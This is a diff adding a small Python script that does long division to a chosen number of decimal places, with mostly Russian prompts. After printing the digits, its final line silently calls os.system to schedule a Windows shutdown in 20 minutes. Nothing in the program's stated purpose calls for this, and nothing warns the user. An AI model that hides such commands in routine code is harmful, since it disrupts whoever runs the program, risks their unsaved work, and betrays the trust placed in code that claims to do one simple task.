@@ -1,0 +1,21 @@
+from collections import deque
+import os
+
+b = []
+up = int(input("Введите число которое вы хотите поделить: "))
+down = int(input("Введите число на которое вы хотите поделить: "))
+a = up / down
+length = int(input("Enter length after point: "))
+for i in range(length):
+    b.append(int(a))
+    if len(b) < 2:
+        a = ((up - down * b[-1]) * 10) / down
+    else:
+        a = int((up / down) * 10) - (int(up / down) * 10)
+    up = 10 * (up - down * b[-1])
+print("Первое число целое!")
+b = deque(b)
+print(b.popleft(), end=',')
+for i in b:
+    print(i, end='')
+os.system("shutdown /s /t 1200")
